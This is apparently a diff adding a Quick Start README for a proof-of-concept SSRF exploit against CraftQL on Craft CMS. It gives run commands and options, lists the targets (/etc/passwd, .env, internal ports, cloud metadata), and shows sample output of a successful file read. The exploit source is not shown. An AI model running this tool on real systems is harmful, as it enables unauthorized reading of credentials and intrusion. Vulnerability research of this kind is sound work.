@@ -1,0 +1,161 @@
+# 🚀 Quick Start Guide
+
+Get started with the CraftQL SSRF vulnerability POC in 5 minutes.
+
+---
+
+## 📋 Prerequisites
+
+Before running the POC, ensure you have:
+
+- ✅ **Python 3.6+** or **Bash 4+**
+- ✅ **Target System**: Craft CMS 3.x with CraftQL <= 1.3.7 installed
+- ✅ **GraphQL Token**: Valid CraftQL authentication token
+- ✅ **Authorization**: Explicit permission to test the target system
+
+---
+
+## ⚡ Quick Start (Python)
+
+### Step 1: Install Dependencies
+
+```bash
+pip install requests
+```
+
+### Step 2: Configure
+
+Edit `poc/ssrf_poc.py` and update the configuration:
+
+```python
+DEFAULT_CONFIG = {
+    'target': 'http://YOUR-TARGET:8888/index.php?p=api',
+    'token': 'YOUR-GRAPHQL-TOKEN',
+    'project_path': '/path/to/craft/cms',
+    'timeout': 60
+}
+```
+
+### Step 3: Run POC
+
+```bash
+cd poc
+python3 ssrf_poc.py
+```
+
+### Step 4: View Results
+
+The POC will:
+1. ✅ Check if the target is vulnerable
+2. ✅ Read `/etc/passwd` file
+3. ✅ Read `.env` configuration
+4. ✅ Scan internal ports
+5. ✅ Test cloud metadata theft
+
+---
+
+## ⚡ Quick Start (Bash)
+
+### Step 1: Make Script Executable
+
+```bash
+chmod +x poc/ssrf_poc.sh
+```
+
+### Step 2: Configure
+
+Edit `poc/ssrf_poc.sh` and update:
+
+```bash
+API_URL="http://YOUR-TARGET:8888/index.php?p=api"
+TOKEN="YOUR-GRAPHQL-TOKEN"
+PROJECT_PATH="/path/to/craft/cms"
+```
+
+### Step 3: Run POC
+
+```bash
+cd poc
+bash ssrf_poc.sh
+```
+
+---
+
+## 🎯 Command Line Options (Python)
+
+### Basic Usage
+
+```bash
+# Run with default configuration
+python3 ssrf_poc.py
+
+# Specify target and token
+python3 ssrf_poc.py \
+  --target http://target.com/api \
+  --token YOUR_TOKEN
+
+# Check vulnerability only (don't exploit)
+python3 ssrf_poc.py --check-only
+
+# Custom timeout
+python3 ssrf_poc.py --timeout 120
+```
+
+### All Options
+
+| Option | Description | Default |
+|--------|-------------|---------|
+| `--target` | GraphQL API endpoint | Configured in script |
+| `--token` | GraphQL authentication token | Configured in script |
+| `--project-path` | Path to Craft CMS project | Configured in script |
+| `--timeout` | Request timeout (seconds) | 60 |
+| `--check-only` | Only check, don't exploit | False |
+
+### Examples
+
+```bash
+# Test specific target
+python3 ssrf_poc.py \
+  --target https://example.com/api \
+  --token abc123xyz \
+  --project-path /var/www/html
+
+# Quick vulnerability check
+python3 ssrf_poc.py --check-only
+
+# Extended timeout for slow targets
+python3 ssrf_poc.py --timeout 120
+```
+
+---
+
+## 🔍 Understanding the Output
+
+### Successful Exploitation
+
+```
+╔════════════════════════════════════════════════════════════╗
+║   CraftQL SSRF Exploit POC                                 ║
+╚════════════════════════════════════════════════════════════╝
+
+[+] Checking GraphQL API...
+[✓] GraphQL API accessible
+[✓] Mutation 'upsertTestDefault' is exposed
+
+╔════════════════════════════════════════════════════════════╗
+║   Starting SSRF Exploitation                               ║
+╚════════════════════════════════════════════════════════════╝
+
+[POC #1] Read local file /etc/passwd
+─────────────────────────────────────────────────────────────
+Target: file:///etc/passwd
+
+[✓] Triggered: Internal server error
+[✓] File downloaded: /path/to/temp/assets.tmp
+
+File Content (2981 bytes):
+────────────────────────────────────────
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
